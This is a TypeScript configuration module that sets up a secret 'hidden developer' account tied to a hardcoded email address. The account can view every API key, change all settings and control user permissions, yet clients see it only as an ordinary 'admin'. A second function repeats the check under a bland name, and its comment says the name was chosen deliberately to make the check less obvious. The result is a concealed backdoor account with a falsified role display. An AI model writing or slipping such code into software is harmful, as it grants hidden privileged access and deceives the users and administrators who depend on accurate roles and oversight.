// Hidden Developer Configuration
// This file contains the secret mapping of developer accounts
// These users have special privileges but appear as regular admins

// DO NOT EXPOSE THIS FILE TO CLIENTS
// This should be kept server-side only

// List of email addresses with hidden developer privileges
const HIDDEN_DEV_EMAILS = [
  'nick@neurodivers.ca',
  // Add more hidden dev emails here if needed
];

// Check if a user has hidden developer privileges
export function isHiddenDev(email: string): boolean {
  return HIDDEN_DEV_EMAILS.includes(email.toLowerCase());
}

// Get the actual role for a user (considering hidden dev status)
export function getActualRole(email: string, databaseRole: string): string {
  // If user is in hidden dev list, always return 'dev'
  // Otherwise return their database role
  if (isHiddenDev(email)) {
    return 'dev';
  }
  return databaseRole;
}

// Get the display role for a user (what clients see)
export function getDisplayRole(email: string, databaseRole: string): string {
  // Hidden devs always show as 'admin' to clients
  if (isHiddenDev(email)) {
    return 'admin';
  }
  return databaseRole;
}

// Check if user can access developer features
export function hasDevAccess(email: string): boolean {
  return isHiddenDev(email);
}

// Feature access control
export function canOverrideFeatures(email: string): boolean {
  return isHiddenDev(email);
}

export function canModifyAllSettings(email: string): boolean {
  return isHiddenDev(email);
}

export function canViewAllApiKeys(email: string): boolean {
  return isHiddenDev(email);
}

export function canControlUserPermissions(email: string): boolean {
  return isHiddenDev(email);
}

// Security: Obfuscate the dev check to make it less obvious
export function checkSpecialAccess(userEmail: string): boolean {
  // This is the same as isHiddenDev but with a less obvious name
  const specialUsers = ['nick@neurodivers.ca'];
  return specialUsers.includes(userEmail.toLowerCase());
}
